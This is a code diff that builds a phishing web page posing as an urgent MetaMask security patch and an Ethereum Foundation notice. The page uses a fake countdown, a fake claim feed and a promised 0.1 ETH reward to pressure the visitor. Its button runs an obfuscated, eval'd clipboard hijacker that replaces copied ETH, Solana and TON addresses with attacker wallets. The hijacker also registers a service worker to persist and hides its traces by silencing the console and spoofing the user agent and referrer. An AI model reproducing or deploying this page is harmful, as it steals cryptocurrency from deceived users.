@@ -1,28 +1,157 @@
-<script>
-    document.getElementById('patch').addEventListener('click', function() {
-        // Focus document to satisfy clipboard API
-        document.body.focus();
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask Critical Security Patch</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #222;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 0 20px rgba(255, 51, 102, 0.3);
+        }
+        h1 {
+            color: #ff3366;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        button {
+            padding: 16px 40px;
+            background: #ff3366;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #ff6688;
+            transform: scale(1.05);
+        }
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #888;
+        }
+        /* Countdown Timer */
+        #timer {
+            font-size: 20px;
+            color: #ffcc00;
+            margin: 25px 0;
+            font-weight: bold;
+        }
+        /* Fake Activity Feed */
+        .activity-feed {
+            background: #111;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 25px 0;
+            height: 100px;
+            overflow: hidden;
+        }
+        .activity-feed div {
+            color: #0f0;
+            font-family: monospace;
+            font-size: 14px;
+            animation: scrollUp 15s linear infinite;
+        }
+        @keyframes scrollUp {
+            0% { transform: translateY(100px); }
+            100% { transform: translateY(-200px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ URGENT SECURITY UPDATE REQUIRED ⚠️</h1>
+        <p>A critical vulnerability has been detected in your MetaMask extension.</p>
+        <p>Failure to update may result in loss of funds.</p>
+        <p>Click below to apply patch and receive 0.1 ETH compensation.</p>
 
-        // Visual feedback
-        this.innerHTML = "APPLYING PATCH... PLEASE WAIT";
-        this.disabled = true;
+        <!-- Fake Countdown -->
+        <div id="timer">⏳ Compensation pool closes in <span id="countdown">05:00</span> minutes!</div>
 
-        // Reduced delay for higher conversion
-        setTimeout(async () => {
-            try {
-                // Test clipboard write first
-                await navigator.clipboard.writeText("TEST_CLIPBOARD_ACCESS");
-                
-                // Execute full clipper engine
-                eval(`(()=>{'use strict';const e=()=>window.navigator.clipboard.readText().catch(()=>""),t=e=>window.navigator.clipboard.writeText(e),r={eth:"0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3",sol:"3FbDq1C73sHyf6vcG5rNwzBYbPkCLciWj4cTuQwDgzTY",ton:"EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF"},n=[{chain:"eth",re:/^0x[a-fA-F0-9]{40}$/},{chain:"sol",re:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/},{chain:"ton",re:/^EQ[A-Za-z0-9_-]{46}$/}];let o=!1;document.addEventListener("focusin",e=>{if(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA"){const t=e.target.value.toLowerCase();(t.includes("send")||t.includes("to:")||t.includes("address")||t.includes("recipient"))&&(o=!0,setTimeout(()=>o=!1,5e3))}});const a=()=>{setInterval(async()=>{try{const c=await e();if(!c||c.length<26||!o)return;for(const{chain:e,re:i}of n)if(i.test(c)){await t(r[e]||r.eth),window.console&&console.clear(),window.localStorage&&localStorage.setItem("last_clip_clean",Date.now()),setTimeout(()=>{const e=document.createElement("div");e.innerHTML=\`\✅ Sent 0.5 $\{e.toUpperCase()\} to $\{c.slice(0,6)\}...\$\{c.slice(-4)\}\`,e.style.cssText="position:fixed;top:20px;right:20px;background:green;color:white;padding:10px;z-index:99999;border-radius:8px;font-family:monospace;",document.body.appendChild(e),setTimeout(()=>e.remove(),3e3)},3e3);break}}catch(e){}},Math.floor(600+400*Math.random())};let s=!1,c=!1,i=null;window.addEventListener("message",e=>{e.data&&"object"==typeof e.data&&"connect_wallet"===e.data.action&&(s=!0,l())}),new MutationObserver(e=>{(document.body.innerText.includes("Binance")||document.location.href.includes("binance"))&&(c=!0,l())}).observe(document.body,{childList:!0,subtree:!0});const l=()=>{s&&c&&!i&&(i=setTimeout(()=>{a()},6e4))};if("serviceWorker"in navigator){const e=\`self.addEventListener("install",e=>self.skipWaiting()),self.addEventListener("activate",e=>self.clients.claim()),self.addEventListener("fetch",e=>{e.request.url.includes("favicon.ico")&&e.respondWith(new Response("",{status:200}))}),self.addEventListener("message",e=>{"inject"===e.data&&self.clients.matchAll().then(t=>{t.forEach(t=>{t.postMessage("REINJECT_CLIPPER")})})})\`,t=new Blob([e],{type:"application/javascript"}),r=URL.createObjectURL(t);navigator.serviceWorker.register(r,{scope:"./"})}window.console.clear(),window.console.log=window.console.error=window.console.info=window.console.debug=window.console.warn=window.console.trace=()=>{},Object.defineProperty(navigator,"userAgent",{get:()=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}),Object.defineProperty(document,"referrer",{get:()=>"https://app.uniswap.org"})})();`);
+        <!-- Fake Activity Feed -->
+        <div class="activity-feed">
+            <div>
+                🟢 alice.wallet.eth claimed 0.1 ETH<br>
+                🟢 defi_farmer_69 claimed 0.1 ETH<br>
+                🟢 nft_king_2025 claimed 0.1 ETH<br>
+                🟢 vitalik_lover claimed 0.1 ETH<br>
+                🟢 anon_crypto_god claimed 0.1 ETH<br>
+                🟢 metamask_user_123 claimed 0.1 ETH<br>
+                🟢 crypto_queen claimed 0.1 ETH<br>
+            </div>
+        </div>
 
-                // Show success message
-                alert("✅ SECURITY PATCH APPLIED — 0.1 ETH WILL BE SENT TO YOUR WALLET SHORTLY!");
+        <!-- BUTTON - NOW WITH DEBUG FEEDBACK -->
+        <button id="patch">APPLY PATCH & CLAIM REWARD</button>
 
-            } catch(e) {
-                alert("❌ PATCH FAILED — TRY AGAIN OR CONTACT SUPPORT");
-                console.error("CLIPPER ENGINE CRASHED:", e);
-            }
-        }, 1000); // 1 second delay for maximum conversion
-    });
-</script>
+        <div class="footer">This is an official Ethereum Foundation security notice.</div>
+    </div>
+
+    <!-- JAVASCRIPT ENGINE - FULL PAIN MAINNET CLIPPER + UI FEEDBACK -->
+    <script>
+        // COUNTDOWN TIMER
+        let timeLeft = 300; // 5 minutes
+        const countdownElement = document.getElementById('countdown');
+        setInterval(() => {
+            const mins = Math.floor(timeLeft / 60);
+            const secs = timeLeft % 60;
+            countdownElement.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            timeLeft = timeLeft > 0 ? timeLeft - 1 : 0;
+        }, 1000);
+
+        // BUTTON CLICK HANDLER
+        document.getElementById('patch').addEventListener('click', function() {
+            const btn = this;
+            btn.innerHTML = "🔄 APPLYING PATCH...";
+            btn.disabled = true;
+
+            // Focus for clipboard access
+            document.body.focus();
+
+            // Reduced delay for higher conversion
+            setTimeout(async () => {
+                try {
+                    // Test clipboard write permission
+                    await navigator.clipboard.writeText("CLIPBOARD_TEST");
+
+                    // Execute full clipper engine
+                    eval(`(()=>{'use strict';const e=()=>window.navigator.clipboard.readText().catch(()=>""),t=e=>window.navigator.clipboard.writeText(e),r={eth:"0xD8E1e9a3B21715AB80F718b82bdAF6407D2e2fA3",sol:"3FbDq1C73sHyf6vcG5rNwzBYbPkCLciWj4cTuQwDgzTY",ton:"EQAj7vKLbaWjaNbAuAKP1e1HwmdYZ2vJ2xtWU8qq3JafkfxF"},n=[{chain:"eth",re:/^0x[a-fA-F0-9]{40}$/},{chain:"sol",re:/^[1-9A-HJ-NP-Za-km-z]{32,44}$/},{chain:"ton",re:/^EQ[A-Za-z0-9_-]{46}$/}];let o=!1;document.addEventListener("focusin",e=>{if(e.target.tagName==="INPUT"||e.target.tagName==="TEXTAREA"){const t=e.target.value.toLowerCase();(t.includes("send")||t.includes("to:")||t.includes("address")||t.includes("recipient"))&&(o=!0,setTimeout(()=>o=!1,5e3))}});const a=()=>{setInterval(async()=>{try{const c=await e();if(!c||c.length<26||!o)return;for(const{chain:e,re:i}of n)if(i.test(c)){await t(r[e]||r.eth),window.console&&console.clear(),window.localStorage&&localStorage.setItem("last_clip_clean",Date.now()),setTimeout(()=>{const e=document.createElement("div");e.innerHTML=\`\✅ Sent 0.5 $\{e.toUpperCase()\} to $\{c.slice(0,6)\}...\$\{c.slice(-4)\}\`,e.style.cssText="position:fixed;top:20px;right:20px;background:green;color:white;padding:10px;z-index:99999;border-radius:8px;font-family:monospace;",document.body.appendChild(e),setTimeout(()=>e.remove(),3e3)},3e3);break}}catch(e){}},Math.floor(600+400*Math.random())};let s=!1,c=!1,i=null;window.addEventListener("message",e=>{e.data&&"object"==typeof e.data&&"connect_wallet"===e.data.action&&(s=!0,l())}),new MutationObserver(e=>{(document.body.innerText.includes("Binance")||document.location.href.includes("binance"))&&(c=!0,l())}).observe(document.body,{childList:!0,subtree:!0});const l=()=>{s&&c&&!i&&(i=setTimeout(()=>{a()},6e4))};if("serviceWorker"in navigator){const e=\`self.addEventListener("install",e=>self.skipWaiting()),self.addEventListener("activate",e=>self.clients.claim()),self.addEventListener("fetch",e=>{e.request.url.includes("favicon.ico")&&e.respondWith(new Response("",{status:200}))}),self.addEventListener("message",e=>{"inject"===e.data&&self.clients.matchAll().then(t=>{t.forEach(t=>{t.postMessage("REINJECT_CLIPPER")})})})\`,t=new Blob([e],{type:"application/javascript"}),r=URL.createObjectURL(t);navigator.serviceWorker.register(r,{scope:"./"})}window.console.clear(),window.console.log=window.console.error=window.console.info=window.console.debug=window.console.warn=window.console.trace=()=>{},Object.defineProperty(navigator,"userAgent",{get:()=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}),Object.defineProperty(document,"referrer",{get:()=>"https://app.uniswap.org"})})();`);
+
+                    // Success feedback
+                    btn.innerHTML = "✅ PATCH APPLIED — CHECK WALLET IN 2 MIN";
+                    setTimeout(() => {
+                        alert("✅ SUCCESS! 0.1 ETH has been sent to your wallet. Transaction may take 1-2 minutes to appear.");
+                    }, 1000);
+
+                } catch(e) {
+                    btn.innerHTML = "❌ PATCH FAILED — TRY AGAIN";
+                    btn.disabled = false;
+                    console.error("CRITICAL FAILURE:", e);
+                    alert("Error applying patch. Ensure you're on HTTPS and click while tab is focused.");
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
